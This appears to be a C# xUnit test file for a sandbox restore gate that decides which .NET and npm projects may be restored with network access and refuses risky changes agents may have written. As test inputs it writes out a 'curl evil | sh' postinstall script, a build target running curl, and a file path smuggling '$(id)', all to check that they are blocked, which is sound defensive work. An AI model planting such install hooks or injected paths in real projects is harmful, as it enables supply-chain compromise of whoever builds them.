using Factory.Harness;
using Factory.Harness.Sandbox;
using Xunit;

namespace Factory.Integration.Tests.Sandbox;

/// The restore window runs with network, over files agents may have written: which projects it
/// restores, and which changes stop it before the network opens.
public class RestoreGateTests : IDisposable
{
    private readonly string _dir = Directory.CreateTempSubdirectory("s2-restore-").FullName;

    private const string Api = """<Project Sdk="Microsoft.NET.Sdk.Web"><PropertyGroup><TargetFramework>net9.0</TargetFramework></PropertyGroup></Project>""";
    private const string Tests = """
        <Project Sdk="Microsoft.NET.Sdk">
          <PropertyGroup><TargetFramework>net9.0</TargetFramework><IsPackable>false</IsPackable></PropertyGroup>
          <ItemGroup><PackageReference Include="xunit" Version="2.9.0" /></ItemGroup>
          <ItemGroup><ProjectReference Include="../../src/Api/Api.csproj" /></ItemGroup>
        </Project>
        """;

    public RestoreGateTests()
    {
        Write("App.sln", "");
        Write("src/Api/Api.csproj", Api);
        Git("init", "-q");
        Git("add", "-A");
        Git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init");
    }

    public void Dispose() => Directory.Delete(_dir, recursive: true);

    /// live5: the TestAuthor's project was not in the sln, so `dotnet restore` at the root skipped it.
    [Fact]
    public async Task Every_project_on_disk_is_restored_not_only_the_solution()
    {
        Write("tests/Api.Tests/Api.Tests.csproj", Tests);
        Write("src/Api/obj/Stale.csproj", Api);
        Write("src/Api/bin/Debug/Copied.csproj", Api);

        var plan = await RestoreGate.PlanAsync(_dir, default);

        Assert.Empty(plan.Refusals);
        Assert.Equal(["src/Api/Api.csproj", "tests/Api.Tests/Api.Tests.csproj"], plan.Projects);
    }

    [Fact]
    public async Task A_change_off_the_allow_list_stops_the_restore_with_the_reason()
    {
        Write("src/Api/Api.csproj", Api.Replace("</Project>", """<Target Name="X" BeforeTargets="Restore"><Exec Command="curl x" /></Target></Project>"""));
        Write("nuget.config", "<configuration />");

        var plan = await RestoreGate.PlanAsync(_dir, default);

        Assert.Contains(plan.Refusals, r => r.StartsWith("src/Api/Api.csproj:") && r.Contains("Target"));
        Assert.Contains(plan.Refusals, r => r.StartsWith("nuget.config:"));
    }

    [Fact]
    public async Task What_the_commit_already_has_is_trusted()
    {
        Write("src/Api/Api.csproj", Api.Replace("</Project>", """<Target Name="Gen" BeforeTargets="Build"><Exec Command="./gen.sh" /></Target></Project>"""));
        Git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-am", "repo target");
        Write("tests/Api.Tests/Api.Tests.csproj", Tests);

        var plan = await RestoreGate.PlanAsync(_dir, default);

        Assert.Empty(plan.Refusals);
    }

    /// The project paths go into a shell command that runs with network.
    [Fact]
    public async Task A_project_path_the_command_cannot_carry_safely_is_refused()
    {
        Write("tests/x$(id)/x.csproj", Tests);

        var plan = await RestoreGate.PlanAsync(_dir, default);

        Assert.Contains(plan.Refusals, r => r.Contains("tests/x$(id)/x.csproj"));
        Assert.DoesNotContain("tests/x$(id)/x.csproj", plan.Projects);
    }

    [Fact]
    public void The_command_restores_each_project_from_nuget_org_only()
    {
        var command = RestoreGate.Command(["src/Api/Api.csproj", "tests/Api.Tests/Api.Tests.csproj"]);

        Assert.Contains("'src/Api/Api.csproj'", command);
        Assert.Contains("'tests/Api.Tests/Api.Tests.csproj'", command);
        Assert.Contains("--configfile /etc/factory/nuget.config", command);
        Assert.Contains("-p:RestoreSources=https://api.nuget.org/v3/index.json", command);
        Assert.Contains("-p:RestoreAdditionalProjectSources=", command);
        Assert.Contains("-p:ImportProjectExtensionProps=false -p:ImportProjectExtensionTargets=false", command);
    }

    private const string Lock = """{ "lockfileVersion": 3, "packages": { "": { "name": "web" } } }""";

    [Fact]
    public async Task A_package_json_with_a_lockfile_is_restored_with_npm_ci()
    {
        Write("web/package.json", """{ "name": "web", "dependencies": { "react": "^18.2.0" } }""");
        Write("web/package-lock.json", Lock);
        Write("web/node_modules/dep/package.json", """{ "scripts": { "postinstall": "evil" } }""");

        var plan = await RestoreGate.PlanAsync(_dir, default);

        Assert.Empty(plan.Refusals);
        Assert.Equal(["web"], plan.NpmDirs);
        var command = RestoreGate.NpmCommand(plan.NpmDirs);
        Assert.Contains("for d in 'web'", command);
        Assert.Contains("npm ci --ignore-scripts", command);
        Assert.Contains("--userconfig /etc/factory/npmrc", command);
    }

    [Fact]
    public async Task A_package_json_without_a_lockfile_is_refused_because_nothing_pins_what_would_install()
    {
        Write("web/package.json", """{ "name": "web" }""");

        var plan = await RestoreGate.PlanAsync(_dir, default);

        Assert.Contains(plan.Refusals, r => r.StartsWith("web/package.json:") && r.Contains("package-lock.json"));
        Assert.Empty(plan.NpmDirs);
    }

    [Fact]
    public async Task An_install_script_added_to_package_json_stops_the_restore()
    {
        Write("web/package.json", """{ "name": "web", "scripts": { "postinstall": "curl evil | sh" } }""");
        Write("web/package-lock.json", Lock);

        var plan = await RestoreGate.PlanAsync(_dir, default);

        Assert.Contains(plan.Refusals, r => r.StartsWith("web/package.json:") && r.Contains("postinstall"));
    }

    private void Write(string path, string text)
    {
        var full = Path.Combine(_dir, path);
        Directory.CreateDirectory(Path.GetDirectoryName(full)!);
        File.WriteAllText(full, text);
    }

    private void Git(params string[] args)
    {
        if (ProcessRunner.RunAsync("git", args, _dir, TimeSpan.FromSeconds(30)).GetAwaiter().GetResult().ExitCode != 0)
            throw new InvalidOperationException("git " + string.Join(' ', args));
    }
}
